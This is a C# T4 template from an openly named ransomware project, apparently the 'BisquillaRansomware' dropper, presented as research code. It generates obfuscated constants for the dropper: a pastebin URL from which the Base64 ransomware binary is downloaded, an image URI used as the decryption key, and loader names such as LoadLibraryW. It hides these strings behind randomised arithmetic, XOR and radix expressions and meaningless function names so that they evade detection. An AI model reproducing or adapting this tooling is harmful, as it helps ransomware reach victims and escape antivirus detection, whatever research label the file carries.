<#@ template hostspecific="false" language="C#" #>
<#@ assembly name="System.Core" #>
<#@ import namespace="System.Linq" #>
<#@ import namespace="System.Text" #>
<#@ import namespace="System.Collections.Generic" #>
<#@ output extension=".cs" #>

/************************************************************************************************************
 * This code is created and maintened only for a research proposal. Please do not use for other proposes.   *
 * Author: Th3 0bservator                                                                                   *
 * Source: https://github.com/guibacellar/BisquillaRansomware                                               *
 * Site: https://www.theobservator.net                                                                      *
 ************************************************************************************************************/

//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a T4 template on 'ProgramGenerated.tt' file.
//     Generated on: <#=System.DateTime.Now.ToString()#>
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated. Re-run the T4 template to update this file.
// </auto-generated>
//------------------------------------------------------------------------------

using System;
namespace BisquillaRansomwareDropper
{
	/// <summary>
    /// Dropper Generated Partial Main Class. This file is auto generated and contains all constants from Program Class. The generation process protect all the strings.
    /// </summary>
	partial class Program {
        
		/// <summary>
		/// Path to Download Bae64 Ransomware Binary
		/// </summary>
		private static readonly string RANSOMWARE_DOWNLOAD_PATH = <# Encode("https://pastebin.com/raw/0w2YZMhP"); #>

		/// <summary>
		/// Image Path to be Used as Decryption Key
		/// </summary>
		private static readonly string DECRYPTION_IMAGE_URI = <# Encode("https://extra.globo.com/incoming/5921498-9a8-629/w1920h1080/marte-1.jpg"); #>

		/// <summary>
		/// Assembly Entrypoint Function Name
		/// </summary>
		private static readonly string targetDotNetAssemblyEntryPointMethodName = <# Encode("EntryPoint"); #>

		/// <summary>
		/// Assembly Full Name
		/// </summary>
		private static readonly string targetDotNetAssemblyEntryPointAssemblyType = <# Encode("BisquillaRansomware.Program"); #>

		/// <summary>
		/// C++ CLR Method Name
		/// </summary>
		private static readonly string loaderFunctionName = <# Encode("LoadDNA"); #>

		/// <summary>
		/// LoadLibraryW Function Name
		/// </summary>
		private static readonly string llwFuntionName = <# Encode("LoadLibraryW"); #>

		/// <summary>
		/// Standard Separator
		/// </summary>
		private static readonly string separator = <# Encode("\t"); #>

		// Write Functions Here
		<# Write(allFunctions); #>
	}
}


<#+
    System.Random random = new Random((int)System.DateTime.UtcNow.Ticks);
	char[] nameMatrix = new char[] { '1', '0', 'O', 'l' };
	string allFunctions = "";

	/// <summary>
	/// Generate Random Function Name
	/// </summary>
	/// <param name="size"></param>
	/// <returns></returns>
    string GenerateRandomFunctionName(int size)
    {
        StringBuilder sb = new StringBuilder();

        sb.Append("_");
        for (int i = 0; i < size; i++)
        {
            sb.Append(nameMatrix[random.Next(0, nameMatrix.Length)]);
        }

        return sb.ToString();
    }

    /// <summary>
    /// Generate Random Byte
    /// </summary>
    byte GenerateRandomByte(int min, int max)
    {
        return (byte)random.Next(min, max);
    }

    /// <summary>
    /// Generate Random Key in Base64
    /// </summary>
    byte[] GenerateRandomKeyInBase64(int size)
    {
        byte[] hResult = new byte[size];
        random.NextBytes(hResult);
        return hResult;
    }

    /// <summary>
    /// Apply OTP Encryption
    /// </summary>
    /// <param name="source">Source Data</param>
    /// <param name="key">Key</param>
    /// <returns></returns>
    byte[] EncryptDecrypt(byte[] source, byte[] key)
    {
        byte[] hResult = new byte[source.Length];

        for (int i = 0; i < source.Length; i++)
        {
            hResult[i] = (byte)(source[i] ^ key[i]);
        }

        return hResult;
    }

    /// <summary>
    /// Decompose String into Char
    /// </summary>
    /// <param name="str"></param>
    /// <returns></returns>
    string DecomposeStringIntoChar(String str)
    {
        StringBuilder hResult = new StringBuilder();

        hResult.Append("(");
        foreach (char item in str)
        {
            int mode = GenerateRandomByte(1, 3);
            switch (mode)
            {
                case 1:
                    hResult.AppendFormat("((char) {0})+\"\"", DecomposeNumberIntoEquation(item, GenerateRandomByte(3, 8), true));
                    break;

                default:
                    hResult.AppendFormat("\"{0}\"", item);
                    break;
            }

            hResult.Append("+");
        }
        hResult = hResult.Remove(hResult.Length - 1, 1);
        hResult.Append(")");

        return hResult.ToString();
    }

    /// <summary>
    /// Convert a Number into Other Format
    /// </summary>
    /// <param name="number"></param>
    /// <returns></returns>
    string ConvertNumberIntoOtherFormat(int number)
    {
        int mode = GenerateRandomByte(1, 5);
        int decomposeEquationLevels = GenerateRandomByte(3, 8);

        switch (mode)
        {
            case 1: // Simple String
                return String.Format("int.Parse({0})", DecomposeStringIntoChar(number.ToString()));

            case 2: // Binary
                    return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 2)), DecomposeNumberIntoEquation(2, decomposeEquationLevels, true));

            case 3: // Hex
                return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 16)), DecomposeNumberIntoEquation(16, decomposeEquationLevels, true));

            case 4: // Octal
                return String.Format("Convert.ToInt32({0}, {1})", DecomposeStringIntoChar(Convert.ToString(number, 8)), DecomposeNumberIntoEquation(8, decomposeEquationLevels, true));

            default:
                return DecomposeNumberIntoEquation(number, decomposeEquationLevels).ToString();
        }

            
    }

    /// <summary>
    /// Decompose Number into Equation
    /// </summary>
    /// <param name="number">Target Number</param>
    /// <param name="level">Current Level</param>
    /// <param name="doNotDecomposeIntoOtherFormat">Avoid to Decompose into Other Format</param>
    /// <returns>Equation</returns>
    string DecomposeNumberIntoEquation(int number, int level, bool doNotDecomposeIntoOtherFormat=false)
    {
        if (level <= 1 || number <= 1)
        {
            if (doNotDecomposeIntoOtherFormat)
            {
                return number.ToString();
            }
            return ConvertNumberIntoOtherFormat(number);
        }

        StringBuilder hResult = new StringBuilder();

        int mode = GenerateRandomByte(1, 4);
        int currentNumber = number;

        int randomElement = GenerateRandomByte(1, currentNumber - 1);

        switch (mode)
        {
            case 1: // Simple Subtraction
                currentNumber -= randomElement;
                hResult.AppendFormat("({0}+{1})", DecomposeNumberIntoEquation(currentNumber, level-1, doNotDecomposeIntoOtherFormat), DecomposeNumberIntoEquation(randomElement, level-1, doNotDecomposeIntoOtherFormat));
                break;

            case 2: // Simple Adition
                currentNumber += randomElement;
                hResult.AppendFormat("({0}-{1})", DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat), DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat));
                break;

            case 3: // XOR
                currentNumber = currentNumber ^ randomElement;
                hResult.AppendFormat("({0}^{1})", DecomposeNumberIntoEquation(currentNumber, level - 1, doNotDecomposeIntoOtherFormat), DecomposeNumberIntoEquation(randomElement, level - 1, doNotDecomposeIntoOtherFormat));
                break;

            default:
                throw new NotImplementedException();
        }

        return hResult.ToString();
    }

    /// <summary>
    /// Obfuscate String
    /// </summary>
    /// <param name="input"></param>
    /// <returns></returns>
    public string ObfuscateString(String input, String functionName)
    {
        StringBuilder sb = new StringBuilder();

        sb.Append("static string " + functionName + "() {");
        sb.Append("return new String(new char[] { ");

        foreach (char item in input)
        {
            sb.AppendFormat("(char) {0},", DecomposeNumberIntoEquation(item, 2));
        }

        sb.Append("});");
        sb.Append("}");

        return sb.ToString();
    }

	void Encode(String input) 
	{
		String functionName = GenerateRandomFunctionName(20);
		String decodeMethod = ObfuscateString(input, functionName);

		Write(functionName);
		Write("(); // " + input);
		WriteLine("");

		allFunctions+="\r\n";
		allFunctions+=decodeMethod;
	}
#>